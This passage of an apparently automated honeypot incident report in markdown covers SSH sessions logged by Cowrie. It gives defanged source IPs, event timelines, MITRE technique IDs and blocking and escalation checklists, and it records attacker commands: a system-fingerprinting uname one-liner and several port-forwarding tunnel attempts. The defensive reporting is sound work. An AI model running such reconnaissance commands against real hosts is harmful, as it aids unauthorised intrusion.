- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2b6abdb4e40

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:36 |
| **Last Seen** | 2026-08-30 13:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:36:39` | `cowrie.session.connect` |
| `2026-08-30 13:36:39` | `cowrie.client.version` |
| `2026-08-30 13:36:39` | `cowrie.client.kex` |
| `2026-08-30 13:36:41` | `cowrie.login.success` |
| `2026-08-30 13:36:42` | `cowrie.session.params` |
| `2026-08-30 13:36:42` | `cowrie.command.input` |
| `2026-08-30 13:36:42` | `cowrie.command.input` |
| `2026-08-30 13:36:42` | `cowrie.command.input` |
| `2026-08-30 13:36:42` | `cowrie.command.input` |
| `2026-08-30 13:36:42` | `cowrie.command.input` |
| `2026-08-30 13:36:42` | `cowrie.command.success` |
| `2026-08-30 13:36:42` | `cowrie.command.input` |
| `2026-08-30 13:36:42` | `cowrie.command.input` |
| `2026-08-30 13:36:42` | `cowrie.command.input` |
| `2026-08-30 13:36:42` | `cowrie.command.input` |
| `2026-08-30 13:36:43` | `cowrie.log.closed` |
| `2026-08-30 13:36:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7db62763bc77

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:37 |
| **Last Seen** | 2026-08-30 13:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:37:22` | `cowrie.session.connect` |
| `2026-08-30 13:37:22` | `cowrie.client.version` |
| `2026-08-30 13:37:23` | `cowrie.client.kex` |
| `2026-08-30 13:37:23` | `cowrie.login.success` |
| `2026-08-30 13:37:24` | `cowrie.session.params` |
| `2026-08-30 13:37:24` | `cowrie.command.input` |
| `2026-08-30 13:37:24` | `cowrie.log.closed` |
| `2026-08-30 13:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a17f10852b7b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 13:38 |
| **Last Seen** | 2026-08-30 13:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:38:11` | `cowrie.session.connect` |
| `2026-08-30 13:38:11` | `cowrie.client.version` |
| `2026-08-30 13:38:11` | `cowrie.client.kex` |
| `2026-08-30 13:38:12` | `cowrie.login.success` |
| `2026-08-30 13:38:12` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:38:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 13:38:12` | `cowrie.direct-tcpip.data` |
| `2026-08-30 13:38:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f34a9c7a46a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:38 |
| **Last Seen** | 2026-08-30 13:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:38:16` | `cowrie.session.connect` |
| `2026-08-30 13:38:17` | `cowrie.client.version` |
| `2026-08-30 13:38:17` | `cowrie.client.kex` |
| `2026-08-30 13:38:19` | `cowrie.login.success` |
| `2026-08-30 13:38:20` | `cowrie.session.params` |
| `2026-08-30 13:38:20` | `cowrie.command.input` |
| `2026-08-30 13:38:20` | `cowrie.command.input` |
| `2026-08-30 13:38:20` | `cowrie.command.input` |
| `2026-08-30 13:38:20` | `cowrie.command.input` |
| `2026-08-30 13:38:20` | `cowrie.command.input` |
| `2026-08-30 13:38:20` | `cowrie.command.success` |
| `2026-08-30 13:38:20` | `cowrie.command.input` |
| `2026-08-30 13:38:20` | `cowrie.command.input` |
| `2026-08-30 13:38:20` | `cowrie.command.input` |
| `2026-08-30 13:38:20` | `cowrie.command.input` |
| `2026-08-30 13:38:21` | `cowrie.log.closed` |
| `2026-08-30 13:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8971637e1962

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 13:38 |
| **Last Seen** | 2026-08-30 13:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:38:18` | `cowrie.session.connect` |
| `2026-08-30 13:38:18` | `cowrie.client.version` |
| `2026-08-30 13:38:18` | `cowrie.client.kex` |
| `2026-08-30 13:38:19` | `cowrie.login.success` |
| `2026-08-30 13:38:19` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:38:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 13:38:20` | `cowrie.direct-tcpip.data` |
| `2026-08-30 13:38:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cbccb15b767

| Field | Detail |
|---|---|
| **Source IP** | `103.251.143[.]14` |
| **First Seen** | 2026-08-30 13:38 |
| **Last Seen** | 2026-08-30 13:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:38:29` | `cowrie.session.connect` |
| `2026-08-30 13:38:29` | `cowrie.client.version` |
| `2026-08-30 13:38:29` | `cowrie.client.kex` |
| `2026-08-30 13:38:31` | `cowrie.login.success` |
| `2026-08-30 13:38:32` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:38:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.251.143[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.251.143[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-059162299b05

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-08-30 13:38 |
| **Last Seen** | 2026-08-30 13:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:38:37` | `cowrie.session.connect` |
| `2026-08-30 13:38:38` | `cowrie.client.version` |
| `2026-08-30 13:38:38` | `cowrie.client.kex` |
| `2026-08-30 13:38:39` | `cowrie.login.success` |
| `2026-08-30 13:38:39` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:38:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcf18078e735

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:39 |
| **Last Seen** | 2026-08-30 13:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:39:53` | `cowrie.session.connect` |
| `2026-08-30 13:39:53` | `cowrie.client.version` |
| `2026-08-30 13:39:53` | `cowrie.client.kex` |
| `2026-08-30 13:39:53` | `cowrie.login.success` |
| `2026-08-30 13:39:54` | `cowrie.session.params` |
| `2026-08-30 13:39:54` | `cowrie.command.input` |
| `2026-08-30 13:39:54` | `cowrie.log.closed` |
| `2026-08-30 13:39:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86ef8ff92be3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:39 |
| **Last Seen** | 2026-08-30 13:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:39:56` | `cowrie.session.connect` |
| `2026-08-30 13:39:56` | `cowrie.client.version` |
| `2026-08-30 13:39:56` | `cowrie.client.kex` |
| `2026-08-30 13:39:58` | `cowrie.login.success` |
| `2026-08-30 13:39:59` | `cowrie.session.params` |
| `2026-08-30 13:39:59` | `cowrie.command.input` |
| `2026-08-30 13:39:59` | `cowrie.command.input` |
| `2026-08-30 13:39:59` | `cowrie.command.input` |
| `2026-08-30 13:39:59` | `cowrie.command.input` |
| `2026-08-30 13:39:59` | `cowrie.command.input` |
| `2026-08-30 13:39:59` | `cowrie.command.success` |
| `2026-08-30 13:39:59` | `cowrie.command.input` |
| `2026-08-30 13:39:59` | `cowrie.command.input` |
| `2026-08-30 13:39:59` | `cowrie.command.input` |
| `2026-08-30 13:39:59` | `cowrie.command.input` |
| `2026-08-30 13:40:00` | `cowrie.log.closed` |
| `2026-08-30 13:40:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22bd2f9dabab

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:41 |
| **Last Seen** | 2026-08-30 13:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:41:34` | `cowrie.session.connect` |
| `2026-08-30 13:41:34` | `cowrie.client.version` |
| `2026-08-30 13:41:34` | `cowrie.client.kex` |
| `2026-08-30 13:41:36` | `cowrie.login.success` |
| `2026-08-30 13:41:38` | `cowrie.session.params` |
| `2026-08-30 13:41:38` | `cowrie.command.input` |
| `2026-08-30 13:41:38` | `cowrie.command.input` |
| `2026-08-30 13:41:38` | `cowrie.command.input` |
| `2026-08-30 13:41:38` | `cowrie.command.input` |
| `2026-08-30 13:41:38` | `cowrie.command.input` |
| `2026-08-30 13:41:38` | `cowrie.command.success` |
| `2026-08-30 13:41:38` | `cowrie.command.input` |
| `2026-08-30 13:41:38` | `cowrie.command.input` |
| `2026-08-30 13:41:38` | `cowrie.command.input` |
| `2026-08-30 13:41:38` | `cowrie.command.input` |
| `2026-08-30 13:41:38` | `cowrie.log.closed` |
| `2026-08-30 13:41:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-181d9d9a4e63

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:42 |
| **Last Seen** | 2026-08-30 13:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:42:19` | `cowrie.session.connect` |
| `2026-08-30 13:42:19` | `cowrie.client.version` |
| `2026-08-30 13:42:19` | `cowrie.client.kex` |
| `2026-08-30 13:42:19` | `cowrie.login.success` |
| `2026-08-30 13:42:20` | `cowrie.session.params` |
| `2026-08-30 13:42:20` | `cowrie.command.input` |
| `2026-08-30 13:42:20` | `cowrie.log.closed` |
| `2026-08-30 13:42:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9850d1597868

| Field | Detail |
|---|---|
| **Source IP** | `112.26.99[.]93` |
| **First Seen** | 2026-08-30 13:42 |
| **Last Seen** | 2026-08-30 13:42 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:42:39` | `cowrie.session.connect` |
| `2026-08-30 13:42:43` | `cowrie.client.version` |
| `2026-08-30 13:42:43` | `cowrie.client.kex` |
| `2026-08-30 13:42:47` | `cowrie.login.success` |
| `2026-08-30 13:42:48` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:42:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.26.99[.]93` to AbuseIPDB if not already reported
- [ ] Block `112.26.99[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bda252cadfc

| Field | Detail |
|---|---|
| **Source IP** | `14.33.96[.]3` |
| **First Seen** | 2026-08-30 13:42 |
| **Last Seen** | 2026-08-30 13:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:42:55` | `cowrie.session.connect` |
| `2026-08-30 13:42:55` | `cowrie.client.version` |
| `2026-08-30 13:42:55` | `cowrie.client.kex` |
| `2026-08-30 13:42:58` | `cowrie.login.success` |
| `2026-08-30 13:42:58` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:43:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.96[.]3` to AbuseIPDB if not already reported
- [ ] Block `14.33.96[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61750f95f695

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:43 |
| **Last Seen** | 2026-08-30 13:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:43:14` | `cowrie.session.connect` |
| `2026-08-30 13:43:15` | `cowrie.client.version` |
| `2026-08-30 13:43:15` | `cowrie.client.kex` |
| `2026-08-30 13:43:16` | `cowrie.login.success` |
| `2026-08-30 13:43:18` | `cowrie.session.params` |
| `2026-08-30 13:43:18` | `cowrie.command.input` |
| `2026-08-30 13:43:18` | `cowrie.command.input` |
| `2026-08-30 13:43:18` | `cowrie.command.input` |
| `2026-08-30 13:43:18` | `cowrie.command.input` |
| `2026-08-30 13:43:18` | `cowrie.command.input` |
| `2026-08-30 13:43:18` | `cowrie.command.success` |
| `2026-08-30 13:43:18` | `cowrie.command.input` |
| `2026-08-30 13:43:18` | `cowrie.command.input` |
| `2026-08-30 13:43:18` | `cowrie.command.input` |
| `2026-08-30 13:43:18` | `cowrie.command.input` |
| `2026-08-30 13:43:18` | `cowrie.log.closed` |
| `2026-08-30 13:43:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5741522c21b2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:44 |
| **Last Seen** | 2026-08-30 13:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:44:49` | `cowrie.session.connect` |
| `2026-08-30 13:44:49` | `cowrie.client.version` |
| `2026-08-30 13:44:49` | `cowrie.client.kex` |
| `2026-08-30 13:44:49` | `cowrie.login.success` |
| `2026-08-30 13:44:50` | `cowrie.session.params` |
| `2026-08-30 13:44:50` | `cowrie.command.input` |
| `2026-08-30 13:44:50` | `cowrie.log.closed` |
| `2026-08-30 13:44:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2443a8c3a96b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:44 |
| **Last Seen** | 2026-08-30 13:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:44:58` | `cowrie.session.connect` |
| `2026-08-30 13:44:58` | `cowrie.client.version` |
| `2026-08-30 13:44:58` | `cowrie.client.kex` |
| `2026-08-30 13:44:59` | `cowrie.login.success` |
| `2026-08-30 13:45:01` | `cowrie.session.params` |
| `2026-08-30 13:45:01` | `cowrie.command.input` |
| `2026-08-30 13:45:01` | `cowrie.command.input` |
| `2026-08-30 13:45:01` | `cowrie.command.input` |
| `2026-08-30 13:45:01` | `cowrie.command.input` |
| `2026-08-30 13:45:01` | `cowrie.command.input` |
| `2026-08-30 13:45:01` | `cowrie.command.success` |
| `2026-08-30 13:45:01` | `cowrie.command.input` |
| `2026-08-30 13:45:01` | `cowrie.command.input` |
| `2026-08-30 13:45:01` | `cowrie.command.input` |
| `2026-08-30 13:45:01` | `cowrie.command.input` |
| `2026-08-30 13:45:01` | `cowrie.log.closed` |
| `2026-08-30 13:45:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0922643e976d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:46 |
| **Last Seen** | 2026-08-30 13:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:46:39` | `cowrie.session.connect` |
| `2026-08-30 13:46:40` | `cowrie.client.version` |
| `2026-08-30 13:46:40` | `cowrie.client.kex` |
| `2026-08-30 13:46:41` | `cowrie.login.success` |
| `2026-08-30 13:46:42` | `cowrie.session.params` |
| `2026-08-30 13:46:42` | `cowrie.command.input` |
| `2026-08-30 13:46:42` | `cowrie.command.input` |
| `2026-08-30 13:46:42` | `cowrie.command.input` |
| `2026-08-30 13:46:42` | `cowrie.command.input` |
| `2026-08-30 13:46:42` | `cowrie.command.input` |
| `2026-08-30 13:46:42` | `cowrie.command.success` |
| `2026-08-30 13:46:42` | `cowrie.command.input` |
| `2026-08-30 13:46:42` | `cowrie.command.input` |
| `2026-08-30 13:46:42` | `cowrie.command.input` |
| `2026-08-30 13:46:42` | `cowrie.command.input` |
| `2026-08-30 13:46:42` | `cowrie.log.closed` |
| `2026-08-30 13:46:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7918e8027c75

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:47 |
| **Last Seen** | 2026-08-30 13:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

